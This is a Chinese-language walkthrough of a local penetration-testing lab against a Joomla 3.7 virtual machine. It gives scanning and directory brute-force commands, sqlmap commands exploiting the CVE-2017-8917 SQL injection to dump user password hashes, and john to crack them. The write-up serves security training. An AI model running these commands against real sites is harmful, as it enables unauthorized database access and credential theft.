NAT连接，确保kali和虚拟机在同一网段

kali：192.168.152.130

如果遇到虚拟机开启提示  IDE0:1移动到IDE0:0  配置错误,删除CD/DVD就可以

扫描存活主机

arp-scan -l
masscan -p 80,22 192.168.152.0/24
nmap -sP 192.168.152.0/24

扫描开放端口

nmap -sS -sV -v -p- -A 192.168.152.246

开放80端口，那就访问80端口

访问80端口看下网站信息

得到信息：

CMS---------->Joomla

脚本---------->PHP

操作系统--->Ubuntu

主页面有提示

知道CMS是Joomla后，又可以利用工具扫扫

爆破下目录

dirb http://192.168.152.247

http://192.168.152.247/README.txt

访问此路径，可以看到版本为3.7

确认了版本，存在SQL注入(CVE-2017-8917)

CVE-2017-8917 SQL注入

sqlmap -u "http://192.168.152.247/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"  --dbs --batch

爆出表

sqlmap -u "http://192.168.152.247/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"  -D joomladb --tables --batch

爆出字段

sqlmap -u "http://192.168.152.247/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" --columns  -p list[fullordering]

爆出值

sqlmap -u "http://192.168.152.247/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C name,password --dump  -p list[fullordering]

利用john爆破

vim pass.txt //把password复制到txt
john pass.txt
